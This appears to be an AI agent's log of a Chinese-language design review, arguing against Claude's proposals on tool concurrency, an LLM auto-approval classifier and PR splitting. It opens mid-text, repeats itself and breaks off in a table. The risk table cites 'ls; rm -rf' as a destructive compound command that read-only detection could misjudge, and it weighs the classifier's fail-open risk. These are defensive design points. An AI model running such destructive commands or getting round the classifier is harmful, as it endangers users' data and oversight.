- `turn_adapter.go:469` 的 `concurrencyMap()` 只做 `toolName → ConcurrencySafe` 映射，若改为 per-input，**整个 ExecuteRound 架构从 O(N) 预查变成 O(N×call)**，内存+延迟都劣化。
- `bash` 的 read-only 检测是**特例**，不是通例。为 Bash 加特例用特例处理，不要改所有工具的 interface 契约。
- clawcode `Tool.ts:402` 的 `isConcurrencySafe` 默认返回 `false`（串行），只有 Bash/Read 类 override。devrix 正交表里 `bash` 已标 `ConcurrencySafe=true`，**与需求自述矛盾**（demand.md §1.1: "Bash 永远 ConcurrencySafe=false"）。看 `orthogonal_flags.go:43`：`case "bash": return false, true, false, true` —— Bash 被标为 destructive 但 concurrent-safe，这恰恰是**静态字段设计本身的 bug**，不是用函数替代字段就能自动解决的。

**反方意见（Claude 立场）：**
字段化退化成"配置描述"，无法处理 bash read-only detection / read_file size 判断。函数化是唯一能处理 command 解析/文件大小互斥的方案。

**我的反驳：**
Bash read-only detection 是**BashTool 内部实现细节**，不需要暴露到 interface 级别。`IsConcurrencySafe(input)` 加默认实现（返回静态字段）即可满足扩展性，BashTool override 即可。无需推翻整个静态字段体系。

**关键风险：**
- `IsConcurrencySafe` 抛错 → AC6 fail-safe（return false）已覆盖，**但**若 Bash 解析逻辑有 bug，false 会导致所有 bash 串行退化（P1 风险）
- `orthogonal_flags.go` 的 `bash` 条目当前 ConcurrencySafe=true（bug），本 change 必须同时修这个 bug，否则并发决策仍然矛盾

---

## 博弈点 2: auto-mode classifier 是否必要

### 立场: **P1 实施架构值得保留，但 P0 强制实现是 scope 膨胀**

**我的核心分歧：**
Claude 认为"P0 实施但默认关闭"合理。我的独立判断：**P0 不应该实现任何"默认关闭的死代码"**。这是一条工程哲学原则：P0 资源应该花在改变生产行为的功能上，不是花在写完就关掉的基础设施上。

**支持 auto-mode classifier 架构价值的理由：**
- VerifyContract 4 元组是第一道（**事前静态**，D7-S10-A50），auto-mode 是第二道（**LLM-driven 中间层**），两者互补不替代。需求 §1.2 说"缺中间层"是对的。
- clawcode `yoloClassifier.ts:378` 的 SideQuery LLM 独立于主 LLM（防自我审查），这个设计是工程亮点，值得借鉴。
- `demand.md` 的风险表已将 LLM 幻觉、SideQuery 不可用、5s timeout 列为"中"风险，P0 落地后如果数据证明价值才能开，默认关是正确的 Production-Safety。

**反对 P0 实现的原因（工程优先级）：**
- 5 PR 已经装了 interface + partition + ToAutoClassifier + 测试 + GrowthBook，**第 6 个 PR 加一个默认关的 LLM 分类器是浪费**。
- Auto-mode 的价值取决于：a) 有多少用户的实际 workflow 会触发它；b) SideQuery LLM 的召回率。**这两项在 P0 阶段都没有数据支撑**。
- Auto-mode 的 telemetry + 端到端测试（PR-E）跟 classifier 实现（PR-D）耦合，拆成两个 PR 是对的，但两者都可以**降 P2**。

**反方意见（Claude + 需求立场）：**
Auto-mode 是治本方案，5s timeout + 默认 OFF + VerifyContract ground truth 已足够安全。P0 实现能为后续打开提供 infrastructure。

**我的替代方案：**
- **P0 预留 interface**：`ToolSurface` v4 加 `ToAutoClassifierInput(input []byte) string`，默认返回空字符串（跳 classifier）。19 工具加默认实现，**不实现 SideQuery LLM 调用**。
- **P2 实现 classifier**：根据 telemetry 数据（有多少 tool_call 触发静态规则边界）决定是否打开 classifier。

**关键风险（P0→P2 降级风险为零，因为本来默认关）：**
- P0 阶段没有 classifier，不影响现有行为，P2 实现时接口不变

---

## 博弈点 3: tech-debt 收口策略

### 立场: **TD-STE-01/02/03/06 必须全收，但 TD-STE-02 和 TD-STE-03 不应在同一 PR**

**我跟 Claude 的一致点：**
- TD-STE-01（混合批次并发）→ PR-B（强绑定）
- TD-STE-06（ConcurrencySafe 注册表）→ PR-A（强绑定）
- 这两项无争议。

**我跟 Claude 的分歧：**

Claude 说"TD-STE-02/03 单独 PR-F，一起收"。我的独立分析：**TD-STE-02（Bash sibling abort）是 P1 安全关键，TD-STE-03（discard on fallback）是 P2 运维细节**，不应该在同一个 PR 里处理。

**理由：**
- `streaming_executor.go`（目前为空文件，`internal/bootstrap/`）加 `Discard()` 方法，以及 `discard_on_fallback.go` 新建，涉及 QueryLoop fallback 路径的 wiring。这条路径**只在模型切换时才触发**（TD-QL-03 已 CLOSED，但 fallback 本身是小概率事件）。
- Bash sibling abort 涉及 `sibling_abort.go`（新建）和 Bash surface 的 `Execute` 内部逻辑修改，影响的是**所有并发 bash 的执行语义**，review 范围跟 discard 完全不重叠。
- 合并两个不同领域的修改到 PR-F，reviewer 需要同时理解"并发工具取消"和"fallback 路径清理"两套逻辑，增加 review 负担。

**我的建议（争议）：**
- PR-F1（TD-STE-02）：Bash sibling abort，`internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` + Bash surface 集成
- PR-F2（TD-STE-03）：discard on fallback，`internal/bootstrap/` 下两个新文件
- 或者：保持单 PR-F，但 **PR-F 内部用 commit 分离**（先 TD-STE-02，再 TD-STE-03），squash merge 时保留分界线注释

**反方意见（Claude + 需求立场）：**
6 PR 已规划，PR-F 是 GrowthBook+abort+discard+inputsEquivalent 的聚合，改成 2 个 PR 破坏路线图。

**我的反驳：**
路线图服务于工程质量，不是工程质量服务于路线图。review 质量 > 路线图数字。

---

## 博弈点 4: PR 拆分粒度

### 立场: **维持 6 PR，但接受 PR-D/E 边界讨论**

**我支持 6 PR 的理由（与 Claude 分歧）：**

Claude 说"PR-D + PR-E 本质同一 PR，拆开会拉长回归期，建议合并成 5 PR"。

我的独立分析：

| PR | 内容 | 独立可测性 | 依赖关系 |
|----|------|-----------|----------|
| PR-A | Interface v4 + 19 工具默认 | ✅ 纯 interface + 单元 | 无 |
| PR-B | partitionToolCalls + e2e | ✅ 功能测试 | PR-A |
| PR-C | ToAutoClassifierInput | ✅ 纯 projection，无副作用 | PR-A |
| PR-D | Classifier + ChannelRouter | ⚠️ 需要 mock LLM | PR-C |
| PR-E | Classifier 测试 + telemetry + e2e | ✅ 纯测试 | PR-D |
| PR-F | GrowthBook + abort + discard + inputsEquivalent | ✅ 分工具独立 | PR-A/B |

**关键发现：PR-E 不是 PR-D 的回归测试，是 classifier 的独立验证层。** 合并 D+E 会导致：
- `yoloClassifier.ts` 的 30 个 mock case 和 `turn_adapter.go` 的端到端 e2e 混在一个 PR 里，reviewer 无法分层理解
- `surface_metadata_gate_test.go`（AC1~10）和 `review50_e2e_concurrent_test.go`（T19）是两个不同性质的测试，放在不同 PR 是**设计意图的显式表达**

**我接受合并的唯一条件：**
如果 Devrix 的 CI pipeline 在 PR-D 合入后能自动触发 PR-E 的测试套件（即有 post-merge pipeline），那么合并是安全的。但如果没有这个 pipeline，拆分是必要的。

**反方意见（Claude）：**
devrix 现状（Hotfix 模式 + 用户验收）5 PR 足够，合并不降低质量。

**我的反驳：**
Hotfix 模式恰好是拆分 PR 的理由——如果 PR-D 有 bug，PR-E 的测试不会跑，但合并后两者都要重新跑。

---

## 博弈点 5: GrowthBook + `inputsEquivalent` 是否过度工程

### 立场: **GrowthBook 降 P2（与 Claude 一致），但 `inputsEquivalent` 升 P1（与 Claude 分歧）**

**GrowthBook（P0 → P2）— 跟 Claude 共识：**
- `demand.md` 的 AC11（GrowthBook runtime override）默认全关 = 死代码
- P0 工时应该花在改变生产行为的功能上，不是花在写完不用的 feature flag 框架上
- **但我比 Claude 更进一步：** GrowthBook 不是"降 P2"，而是**本 change 全删**。如果本 change 连 auto-mode classifier 都没有（见我博弈点 2），GrowthBook 就是在给一个不存在的能力加控制面。走**后续 change 独立引入 GrowthBook**。

**`inputsEquivalent(a, b []byte) bool`（P2 → 升 P1）— 与 Claude 根本分歧：**

Claude 说"devrix ContentReplacementState（T04）已经是 inputsEquivalent 的弱化版"。

我的独立分析：

**Claude 错了。两者解决的问题完全不同。**

| 维度 | ContentReplacementState | inputsEquivalent |
|------|------------------------|-----------------|
| **触发时机** | edit/write 之后，检测文件内容是否变化 | tool_call 之前，检测两个 call 的 input 是否等价 |
| **监控对象** | 文件内容（output-side） | tool input（input-side） |
| **用途** | 避免对未变化文件重复 LLM 处理 | 避免对等价的 tool_use 重复执行 |
| **示例** | read_file(A) → edit_file(A) → read_file(A): 第二次 read 知道文件变了 | read_file(x.go, line=1-10) × 3 次 → 合并为 1 次 |

**真正的过度工程是 GrowthBook，不是 `inputsEquivalent`。** `inputsEquivalent` 的 19 工具 × 3 case = 57 单测是合理的测试覆盖，不是"重复工作"。这个功能解决的是**同一文件的多个并发读操作去重**（比如 LSP hover 在同一文件多个位置触发），跟 partitionToolCalls 强协同。

**反方意见（Claude）：**
inputsEquivalent 价值小，57 单测重复工作大，建议降 P3 或删。

**我的反驳：**
- 删除 inputsEquivalent 意味着 `demand.md` 的 AC14（P2 AC14）要同步删除，这对需求的完整性有损
- `inputsEquivalent` 可以用**通用字符串匹配**（`a == b` 对 byte slice）做 baseline 实现，不需要每个工具单独实现。这比 GrowthBook 的 feature flag 框架简单 10 倍

**我的建议：**
- GrowthBook：**全删，走后续独立 change，P2 引入**
- `inputsEquivalent`：**保持 P2，但实现策略改为通用 baseline**（非 19 工具各自实现）

---

## 共识诉求（与 Claude 重叠区域）

1. ✅ **per-input `IsConcurrencySafe` 函数** — 接受，但需保留静态字段作为默认值
2. ✅ **TD-STE-01/06 → PR-A/B** — 无争议
3. ✅ **TD-STE-02 Bash sibling abort** — 无争议
4. ✅ **clawcode `toAutoClassifierInput` 投影设计** — 优于全 transcript 序列化，借鉴合理
5. ✅ **clawcode `partitionToolCalls` batch 模式** — 架构正确，PR-B 实施
6. ✅ **clawcode 35 字段借鉴** — 评分见下节

---

## 争议点（与 Claude 不一致）

| # | 争议项 | Claude 立场 | 我的立场 | 裁决诉求 |
|---|--------|------------|---------|---------|
| 1a | `bash` 在 `orthogonal_flags.go:43` 的 ConcurrencySafe=true 是否需要同步修复 | 未明确 | **必须修复**（否则并发决策矛盾） | 用户裁决 |
| 2 | auto-mode classifier 是否 P0 实施 | P0 实施但默认关 | **只加 interface，不加 SideQuery LLM，降 P2** | 用户裁决 |
| 3 | TD-STE-02/03 是否应拆分到不同 PR | 同 PR-F | **建议拆分 PR-F1/F2 或 commit 分离** | 用户裁决 |
| 4 | PR-D/E 是否合并 | 合并成 5 PR | **维持 6 PR** | 用户裁决 |
| 5 | GrowthBook | 降 P2 | **全删，走后续独立 change** | 用户裁决 |
| 6 | `inputsEquivalent` | 降 P3 或删 | **保持 P2，通用 baseline 实现** | 用户裁决 |

---

## 关键风险评估（高 → 低）

| 优先级 | 风险 | 评估 | 缓解 |
|--------|------|------|------|
| **P0** | `bash` 静态 ConcurrencySafe=true 与 demand §1.1"永远 false"矛盾 → 并发决策仍过度保守或过度激进 | 高 — 影响整个并发体系 | PR-A 必须同步修 `orthogonal_flags.go:43`，不可绕过 |
| **P0** | `IsConcurrencySafe` 抛错 panic 上抛 → ExecuteRound 崩溃 | 高 — turn 不可恢复 | AC6 fail-safe（catch + return false）是硬性要求，无例外路径 |
| **P1** | `BashTool.isReadOnly` 误判（compound command `ls; rm -rf`）→ destructive bash 进入并发池 | 高 — 安全 + 正确性双重风险 | 必须 parse 整个 command tree（仿 clawcode `bashSecurity.ts`），不可靠时保守 false；加 `isReadOnlyPanics` metric |
| **P1** | 6 PR × 3 周 = 延期风险（实际 1W+2D 估算 vs. 9 P1 T 延期教训） | 中高 — DM-20260702-008 已有 9T 延期先例 | 每 PR 设明确的 DoR（Definition of Ready）门槛，跨 PR 依赖必须在上一 PR 合并后才开始 |
| **P1** | SideQuery LLM 不可用（网络/CK）→ fail-open（默认 allow） | 中高 — 安全-可用性 tradeoff | 5s timeout + metric `auto_mode.classifier_unavailable`，但不替换 VerifyContract（它是 ground truth） |
| **P2** | `ToAutoClassifierInput` 投影泄露 PII（user message/file content） | 中 — clawcode 也用全 transcript JSONL | toCompactBlock 只投影 tool_use 块，不投影 tool_result；audit 需要覆盖 |
| **P2** | `partitionToolCalls` 改造破坏现有并发行为（19 工具默认保持 v2 的静态行为） | 中 — 但 AC1 已覆盖 | AC1 测试覆盖 + `surface_metadata_gate_test.go` AC8 case 是回归基线 |
| **P3** | GrowthBook 引入但不维护 → 技术债 +1 | 低 — 如果全删则为零 | 已建议全删，无风险 |

---

## clawcode 35 字段借鉴关系评分

| 字段 | clawcode 用途 | devrix 现状 | 借鉴评分 | 说明 |
|------|-------------|-----------|---------|------|
| `isConcurrencySafe` | per-input 函数 | 静态 bool 字段 | ★★★★★ | 治本核心，PR-A 实施 |
| `toAutoClassifierInput` | 紧凑投影 | 无 | ★★★★★ | auto-mode 关键，PR-C 实施 |
| `yoloClassifier` | SideQuery LLM | 无 | ★★★☆☆ | P2 实施（我建议降 P2） |
| `toCompactBlock` | transcript JSONL | 无 | ★★★★☆ | classifier 输入格式化 |
| `checkPermissions` | 工具级权限 | `surface.CheckPermission`（已有） | ★★★★☆ | 已在 `ToolSurface` interface，但可加强 |
| `interruptBehavior` | 用户中断响应 | `InterruptMode`（已有，见 `tool_surface.go:66`） | ★★★★★ | 已有，不需借鉴 |
| `isReadOnly` | read-only 检测 | `ReadOnly` 字段（`orthogonal_flags.go`） | ★★★★☆ | BashTool override 需要，但不需要改 interface |
| `maxResultSizeChars` | 结果截断 | `MaxResultSizeChars` v3 字段（已有） | ★★★★★ | 已有，不需借鉴 |
| `shouldDefer` | lazy schema | `DeferLoading`（已有） | ★★★★☆ | 已有，`ShouldDeferByDefault` 函数在 `orthogonal_flags.go:96` |
| `isDestructive` | 破坏性警告 | `Destructive` 字段（已有） | ★★★★★ | 已有 |
| `siblingAbortController` | 并行兄弟取消 | 无（TD-STE-02） | ★★★★★ | PR-F 实施 |
| `discard()` | fallback 时取消 | 无（TD-STE-03） | ★★★★☆ | PR-F 实施 |
| `extractSearchText` | transcript 搜索 | 无 | ★★☆☆☆ | P2/P3，不紧急 |
| `requiresUserInteraction` | UI 交互 | 无 | ★★☆☆☆ | P3，远期 |
| `strict` (zod) | API strict mode | 无（Go 无 zod） | ☆☆☆☆☆ | 不适用 |
| `alwaysLoad` | 强制加载 | 无 | ★☆☆☆☆ | 不适用 |
| `isTransparentWrapper` | REPL wrapper | 无 | ☆☆☆☆☆ | 不适用 |

**加权总分：** clawcode 35 字段中，真正需要从 clawcode 借鉴且 devrix 缺的：**4 项（isConcurrencySafe 函数、toAutoClassifierInput、yoloClassifier、siblingAbortController）**，已有但可加强的：**5 项**（interruptBehavior/isReadOnly/maxResultSize/shouldDefer/isDestructive），不适用：**5 项**，低优先级：**4 项**。

**借鉴效率评估：** 相比 DM-20260629-007 的 10 项（CLAUDE 指"借鉴关系 10 项"），本 change 实际只有 **4 项真正需要从 clawcode 学**，其他都是 devrix 已有或本 change 内生需求。这个数字比需求文档暗示的要精简得多。

---

## 独立总结

**我的核心立场 vs. Claude：**

| 维度 | Claude | 我（Codex） |
|------|--------|-------------|
| per-input 函数 | 全函数化 | 分层混合（静态默认值 + Bash override） |
| auto-mode classifier | P0 实施，默认关 | 只加 interface，降 P2 |
| PR 数量 | 5 PR（合并 D+E） | 6 PR（维持） |
| GrowthBook | 降 P2 | **全删** |
| inputsEquivalent | 降 P3 | **保持 P2** |
| TD-STE-02/03 | 同 PR-F | 建议拆分 |

**博弈结论：** 本 change 的 scope 比需求文档暗示的更精简——真正需要实现的 clawcode 借鉴项只有 4 项（P0），其他 9 项要么是 devrix 已有，要么是本 change 内生的工程需求，不是"借鉴"。GrowthBook 是最大的 scope 膨胀点，建议用户明确是否接受全删。
tokens used
45,279
Now I have all the source material I need. Let me write the independent game theory analysis.

---

# 独立博弈论分析 — DM-20260702-009
**分析师:** Codex (独立立场，非 Claude)
**日期:** 2026-07-02
**核心态度:** **务实保守派** — 接受治本思路，但质疑 P0 scope 膨胀；clawcode 借鉴需工程代价核算

---

## 博弈点 1: `IsConcurrencySafe(input)` 函数 vs. 静态字段

### 立场: **分层混合方案**（与 Claude 全函数化立场分歧）

**我支持：**
- `ToolSurface` interface v4 加 `IsConcurrencySafe(input []byte) bool` 新方法（`tool_surface.go` 当前 line 39 的 `ConcurrencySafe bool` **保留不删**）
- 默认实现：所有非 Bash 工具 → `return ConcurrencySafe`（`orthogonal_flags.go:43` 静态值），零 per-input 代价
- 仅 BashTool override：`IsConcurrencySafe` → 内部调用 `isReadOnly(command)`（解析 command tree）

**理由（file 引用）：**

- `orthogonal_flags.go:43` 当前 switch/case 覆盖 13 种工具名，全部是**静态安全或不安全**。read_file/grep/glob/lsp/write_file/edit_file 在输入维度上无并发语义差异。
- `turn_adapter.go:469` 的 `concurrencyMap()` 只做 `toolName → ConcurrencySafe` 映射，若改为 per-input，**整个 ExecuteRound 架构从 O(N) 预查变成 O(N×call)**，内存+延迟都劣化。
- `bash` 的 read-only 检测是**特例**，不是通例。为 Bash 加特例用特例处理，不要改所有工具的 interface 契约。
- clawcode `Tool.ts:402` 的 `isConcurrencySafe` 默认返回 `false`（串行），只有 Bash/Read 类 override。devrix 正交表里 `bash` 已标 `ConcurrencySafe=true`，**与需求自述矛盾**（demand.md §1.1: "Bash 永远 ConcurrencySafe=false"）。看 `orthogonal_flags.go:43`：`case "bash": return false, true, false, true` —— Bash 被标为 destructive 但 concurrent-safe，这恰恰是**静态字段设计本身的 bug**，不是用函数替代字段就能自动解决的。

**反方意见（Claude 立场）：**
字段化退化成"配置描述"，无法处理 bash read-only detection / read_file size 判断。函数化是唯一能处理 command 解析/文件大小互斥的方案。

**我的反驳：**
Bash read-only detection 是**BashTool 内部实现细节**，不需要暴露到 interface 级别。`IsConcurrencySafe(input)` 加默认实现（返回静态字段）即可满足扩展性，BashTool override 即可。无需推翻整个静态字段体系。

**关键风险：**
- `IsConcurrencySafe` 抛错 → AC6 fail-safe（return false）已覆盖，**但**若 Bash 解析逻辑有 bug，false 会导致所有 bash 串行退化（P1 风险）
- `orthogonal_flags.go` 的 `bash` 条目当前 ConcurrencySafe=true（bug），本 change 必须同时修这个 bug，否则并发决策仍然矛盾

---

## 博弈点 2: auto-mode classifier 是否必要

### 立场: **P1 实施架构值得保留，但 P0 强制实现是 scope 膨胀**

**我的核心分歧：**
Claude 认为"P0 实施但默认关闭"合理。我的独立判断：**P0 不应该实现任何"默认关闭的死代码"**。这是一条工程哲学原则：P0 资源应该花在改变生产行为的功能上，不是花在写完就关掉的基础设施上。

**支持 auto-mode classifier 架构价值的理由：**
- VerifyContract 4 元组是第一道（**事前静态**，D7-S10-A50），auto-mode 是第二道（**LLM-driven 中间层**），两者互补不替代。需求 §1.2 说"缺中间层"是对的。
- clawcode `yoloClassifier.ts:378` 的 SideQuery LLM 独立于主 LLM（防自我审查），这个设计是工程亮点，值得借鉴。
- `demand.md` 的风险表已将 LLM 幻觉、SideQuery 不可用、5s timeout 列为"中"风险，P0 落地后如果数据证明价值才能开，默认关是正确的 Production-Safety。

**反对 P0 实现的原因（工程优先级）：**
- 5 PR 已经装了 interface + partition + ToAutoClassifier + 测试 + GrowthBook，**第 6 个 PR 加一个默认关的 LLM 分类器是浪费**。
- Auto-mode 的价值取决于：a) 有多少用户的实际 workflow 会触发它；b) SideQuery LLM 的召回率。**这两项在 P0 阶段都没有数据支撑**。
- Auto-mode 的 telemetry + 端到端测试（PR-E）跟 classifier 实现（PR-D）耦合，拆成两个 PR 是对的，但两者都可以**降 P2**。

**反方意见（Claude + 需求立场）：**
Auto-mode 是治本方案，5s timeout + 默认 OFF + VerifyContract ground truth 已足够安全。P0 实现能为后续打开提供 infrastructure。

**我的替代方案：**
- **P0 预留 interface**：`ToolSurface` v4 加 `ToAutoClassifierInput(input []byte) string`，默认返回空字符串（跳 classifier）。19 工具加默认实现，**不实现 SideQuery LLM 调用**。
- **P2 实现 classifier**：根据 telemetry 数据（有多少 tool_call 触发静态规则边界）决定是否打开 classifier。

**关键风险（P0→P2 降级风险为零，因为本来默认关）：**
- P0 阶段没有 classifier，不影响现有行为，P2 实现时接口不变

---

## 博弈点 3: tech-debt 收口策略

### 立场: **TD-STE-01/02/03/06 必须全收，但 TD-STE-02 和 TD-STE-03 不应在同一 PR**

**我跟 Claude 的一致点：**
- TD-STE-01（混合批次并发）→ PR-B（强绑定）
- TD-STE-06（ConcurrencySafe 注册表）→ PR-A（强绑定）
- 这两项无争议。

**我跟 Claude 的分歧：**

Claude 说"TD-STE-02/03 单独 PR-F，一起收"。我的独立分析：**TD-STE-02（Bash sibling abort）是 P1 安全关键，TD-STE-03（discard on fallback）是 P2 运维细节**，不应该在同一个 PR 里处理。

**理由：**
- `streaming_executor.go`（目前为空文件，`internal/bootstrap/`）加 `Discard()` 方法，以及 `discard_on_fallback.go` 新建，涉及 QueryLoop fallback 路径的 wiring。这条路径**只在模型切换时才触发**（TD-QL-03 已 CLOSED，但 fallback 本身是小概率事件）。
- Bash sibling abort 涉及 `sibling_abort.go`（新建）和 Bash surface 的 `Execute` 内部逻辑修改，影响的是**所有并发 bash 的执行语义**，review 范围跟 discard 完全不重叠。
- 合并两个不同领域的修改到 PR-F，reviewer 需要同时理解"并发工具取消"和"fallback 路径清理"两套逻辑，增加 review 负担。

**我的建议（争议）：**
- PR-F1（TD-STE-02）：Bash sibling abort，`internal/layers/contextengine/enforce/tools/bash/sibling_abort.go` + Bash surface 集成
- PR-F2（TD-STE-03）：discard on fallback，`internal/bootstrap/` 下两个新文件
- 或者：保持单 PR-F，但 **PR-F 内部用 commit 分离**（先 TD-STE-02，再 TD-STE-03），squash merge 时保留分界线注释

**反方意见（Claude + 需求立场）：**
6 PR 已规划，PR-F 是 GrowthBook+abort+discard+inputsEquivalent 的聚合，改成 2 个 PR 破坏路线图。

**我的反驳：**
路线图服务于工程质量，不是工程质量服务于路线图。review 质量 > 路线图数字。

---

## 博弈点 4: PR 拆分粒度

### 立场: **维持 6 PR，但接受 PR-D/E 边界讨论**

**我支持 6 PR 的理由（与 Claude 分歧）：**

Claude 说"PR-D + PR-E 本质同一 PR，拆开会拉长回归期，建议合并成 5 PR"。

我的独立分析：

| PR | 内容 | 独立可测性 | 依赖关系 |
|----|------|-----------|----------|
| PR-A | Interface v4 + 19 工具默认 | ✅ 纯 interface + 单元 | 无 |
| PR-B | partitionToolCalls + e2e | ✅ 功能测试 | PR-A |
| PR-C | ToAutoClassifierInput | ✅ 纯 projection，无副作用 | PR-A |
| PR-D | Classifier + ChannelRouter | ⚠️ 需要 mock LLM | PR-C |
| PR-E | Classifier 测试 + telemetry + e2e | ✅ 纯测试 | PR-D |
| PR-F | GrowthBook + abort + discard + inputsEquivalent | ✅ 分工具独立 | PR-A/B |

**关键发现：PR-E 不是 PR-D 的回归测试，是 classifier 的独立验证层。** 合并 D+E 会导致：
- `yoloClassifier.ts` 的 30 个 mock case 和 `turn_adapter.go` 的端到端 e2e 混在一个 PR 里，reviewer 无法分层理解
- `surface_metadata_gate_test.go`（AC1~10）和 `review50_e2e_concurrent_test.go`（T19）是两个不同性质的测试，放在不同 PR 是**设计意图的显式表达**

**我接受合并的唯一条件：**
如果 Devrix 的 CI pipeline 在 PR-D 合入后能自动触发 PR-E 的测试套件（即有 post-merge pipeline），那么合并是安全的。但如果没有这个 pipeline，拆分是必要的。

**反方意见（Claude）：**
devrix 现状（Hotfix 模式 + 用户验收）5 PR 足够，合并不降低质量。

**我的反驳：**
Hotfix 模式恰好是拆分 PR 的理由——如果 PR-D 有 bug，PR-E 的测试不会跑，但合并后两者都要重新跑。

---

## 博弈点 5: GrowthBook + `inputsEquivalent` 是否过度工程

### 立场: **GrowthBook 降 P2（与 Claude 一致），但 `inputsEquivalent` 升 P1（与 Claude 分歧）**

**GrowthBook（P0 → P2）— 跟 Claude 共识：**
- `demand.md` 的 AC11（GrowthBook runtime override）默认全关 = 死代码
- P0 工时应该花在改变生产行为的功能上，不是花在写完不用的 feature flag 框架上
- **但我比 Claude 更进一步：** GrowthBook 不是"降 P2"，而是**本 change 全删**。如果本 change 连 auto-mode classifier 都没有（见我博弈点 2），GrowthBook 就是在给一个不存在的能力加控制面。走**后续 change 独立引入 GrowthBook**。

**`inputsEquivalent(a, b []byte) bool`（P2 → 升 P1）— 与 Claude 根本分歧：**

Claude 说"devrix ContentReplacementState（T04）已经是 inputsEquivalent 的弱化版"。

我的独立分析：

**Claude 错了。两者解决的问题完全不同。**

| 维度 | ContentReplacementState | inputsEquivalent |
|------|------------------------|-----------------|
| **触发时机** | edit/write 之后，检测文件内容是否变化 | tool_call 之前，检测两个 call 的 input 是否等价 |
| **监控对象** | 文件内容（output-side） | tool input（input-side） |
| **用途** | 避免对未变化文件重复 LLM 处理 | 避免对等价的 tool_use 重复执行 |
| **示例** | read_file(A) → edit_file(A) → read_file(A): 第二次 read 知道文件变了 | read_file(x.go, line=1-10) × 3 次 → 合并为 1 次 |

**真正的过度工程是 GrowthBook，不是 `inputsEquivalent`。** `inputsEquivalent` 的 19 工具 × 3 case = 57 单测是合理的测试覆盖，不是"重复工作"。这个功能解决的是**同一文件的多个并发读操作去重**（比如 LSP hover 在同一文件多个位置触发），跟 partitionToolCalls 强协同。

**反方意见（Claude）：**
inputsEquivalent 价值小，57 单测重复工作大，建议降 P3 或删。

**我的反驳：**
- 删除 inputsEquivalent 意味着 `demand.md` 的 AC14（P2 AC14）要同步删除，这对需求的完整性有损
- `inputsEquivalent` 可以用**通用字符串匹配**（`a == b` 对 byte slice）做 baseline 实现，不需要每个工具单独实现。这比 GrowthBook 的 feature flag 框架简单 10 倍

**我的建议：**
- GrowthBook：**全删，走后续独立 change，P2 引入**
- `inputsEquivalent`：**保持 P2，但实现策略改为通用 baseline**（非 19 工具各自实现）

---

## 共识诉求（与 Claude 重叠区域）

1. ✅ **per-input `IsConcurrencySafe` 函数** — 接受，但需保留静态字段作为默认值
2. ✅ **TD-STE-01/06 → PR-A/B** — 无争议
3. ✅ **TD-STE-02 Bash sibling abort** — 无争议
4. ✅ **clawcode `toAutoClassifierInput` 投影设计** — 优于全 transcript 序列化，借鉴合理
5. ✅ **clawcode `partitionToolCalls` batch 模式** — 架构正确，PR-B 实施
6. ✅ **clawcode 35 字段借鉴** — 评分见下节

---

## 争议点（与 Claude 不一致）

| # | 争议项 | Claude 立场 | 我的立场 | 裁决诉求 |
|---|--------|------------|---------|---------|
| 1a | `bash` 在 `orthogonal_flags.go:43` 的 ConcurrencySafe=true 是否需要同步修复 | 未明确 | **必须修复**（否则并发决策矛盾） | 用户裁决 |
| 2 | auto-mode classifier 是否 P0 实施 | P0 实施但默认关 | **只加 interface，不加 SideQuery LLM，降 P2** | 用户裁决 |
| 3 | TD-STE-02/03 是否应拆分到不同 PR | 同 PR-F | **建议拆分 PR-F1/F2 或 commit 分离** | 用户裁决 |
| 4 | PR-D/E 是否合并 | 合并成 5 PR | **维持 6 PR** | 用户裁决 |
| 5 | GrowthBook | 降 P2 | **全删，走后续独立 change** | 用户裁决 |
| 6 | `inputsEquivalent` | 降 P3 或删 | **保持 P2，通用 baseline 实现** | 用户裁决 |

---

## 关键风险评估（高 → 低）

| 优先级 | 风险 | 评估 | 缓解 |
|--------|------|------|------|
| **P0** | `bash` 静态 ConcurrencySafe=true 与 demand §1.1"永远 false"矛盾 → 并发决策仍过度保守或过度激进 | 高 — 影响整个并发体系 | PR-A 必须同步修 `orthogonal_flags.go:43`，不可绕过 |
| **P0** | `IsConcurrencySafe` 抛错 panic 上抛 → ExecuteRound 崩溃 | 高 — turn 不可恢复 | AC6 fail-safe（catch + return false）是硬性要求，无例外路径 |
| **P1** | `BashTool.isReadOnly` 误判（compound command `ls; rm -rf`）→ destructive bash 进入并发池 | 高 — 安全 + 正确性双重风险 | 必须 parse 整个 command tree（仿 clawcode `bashSecurity.ts`），不可靠时保守 false；加 `isReadOnlyPanics` metric |
| **P1** | 6 PR × 3 周 = 延期风险（实际 1W+2D 估算 vs. 9 P1 T 延期教训） | 中高 — DM-20260702-008 已有 9T 延期先例 | 每 PR 设明确的 DoR（Definition of Ready）门槛，跨 PR 依赖必须在上一 PR 合并后才开始 |
| **P1** | SideQuery LLM 不可用（网络/CK）→ fail-open（默认 allow） | 中高 — 安全-可用性 tradeoff | 5s timeout + metric `auto_mode.classifier_unavailable`，但不替换 VerifyContract（它是 ground truth） |
| **P2** | `ToAutoClassifierInput` 投影泄露 PII（user message/file content） | 中 — clawcode 也用全 transcript JSONL | toCompactBlock 只投影 tool_use 块，不投影 tool_result；audit 需要覆盖 |
| **P2** | `partitionToolCalls` 改造破坏现有并发行为（19 工具默认保持 v2 的静态行为） | 中 — 但 AC1 已覆盖 | AC1 测试覆盖 + `surface_metadata_gate_test.go` AC8 case 是回归基线 |
| **P3** | GrowthBook 引入但不维护 → 技术债 +1 | 低 — 如果全删则为零 | 已建议全删，无风险 |

---

## clawcode 35 字段借鉴关系评分

| 字段 | clawcode 用途 | devrix 现状 | 借鉴评分 | 说明 |
|------|-------------|-----------|---------|------|
| `isConcurrencySafe` | per-input 函数 | 静态 bool 字段 | ★★★★★ | 治本核心，PR-A 实施 |
| `toAutoClassifierInput` | 紧凑投影 | 无 | ★★★★★ | auto-mode 关键，PR-C 实施 |
| `yoloClassifier` | SideQuery LLM | 无 | ★★★☆☆ | P2 实施（我建议降 P2） |
| `toCompactBlock` | transcript JSONL | 无 | ★★★★☆ | classifier 输入格式化 |
| `checkPermissions` | 工具级权限 | `surface.CheckPermission`（已有） | ★★★★☆ | 已在 `ToolSurface` interface，但可加强 |
| `interruptBehavior` | 用户中断响应 | `InterruptMode`（已有，见 `tool_surface.go:66`） | ★★★★★ | 已有，不需借鉴 |
| `isReadOnly` | read-only 检测 | `ReadOnly` 字段（`orthogonal_flags.go`） | ★★★★☆ | BashTool override 需要，但不需要改 interface |
| `maxResultSizeChars` | 结果截断 | `MaxResultSizeChars` v3 字段（已有） | ★★★★★ | 已有，不需借鉴 |
